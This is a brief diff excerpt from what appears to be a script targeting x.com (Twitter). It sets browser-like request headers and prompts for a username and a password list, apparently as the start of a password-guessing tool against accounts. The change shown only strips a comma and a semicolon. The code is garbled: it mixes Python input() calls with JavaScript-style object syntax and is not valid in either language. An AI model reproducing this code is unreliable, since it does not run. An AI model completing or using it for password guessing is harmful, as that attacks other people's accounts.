@@ -55,10 +55,10 @@ headers = [('authority': 'x.com',
     "upgrade-insecure-requests": "1",
     "Referer": "https://twitter.com/",
     "Referrer-Policy": "strict-origin-when-cross-origin"
-  },
+  }
   "body": null,
   "method": "GET"
-});
+})
 
 username = input('\033[1;37muser : \033[1;37m')
 passwordList = input('\033[1;37mpassword : \033[1;37m')
